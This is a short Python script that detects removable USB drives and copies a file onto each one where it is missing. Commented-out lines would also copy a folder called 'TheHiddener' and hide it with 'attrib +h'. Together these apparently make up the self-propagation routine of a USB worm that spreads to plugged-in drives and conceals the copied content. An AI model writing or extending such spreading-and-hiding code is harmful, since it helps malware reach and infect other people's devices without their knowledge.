import os
import time
import threading
import shutil
import psutil


def FindEm():
    
    UsbDrives = []
    for partition in psutil.disk_partitions():
        if "removable" in partition.opts:
            UsbDrives.append(partition.device)
    return UsbDrives
#........................................................................................................            

def  Duplicata(filePath, usbDrive):
    exc_stat = ""
    destination = os.path.join(usbDrive, os.path.basename(filePath))
    #destination2 = os.path.join(usbDrive, os.path.basename(TheHiddener))
    if not os.path.exists(destination):
        try:
            shutil.copy(filePath, destination)
           #Ceci = shutil.copytree(TheHiddener, destination2)
            #os.system(f"attrib +h {Ceci}")
        except Exception as Uc:
            exc_stat = f"duplicata.STAT_{str(Uc)}"
    else: 
        pass
    return exc_stat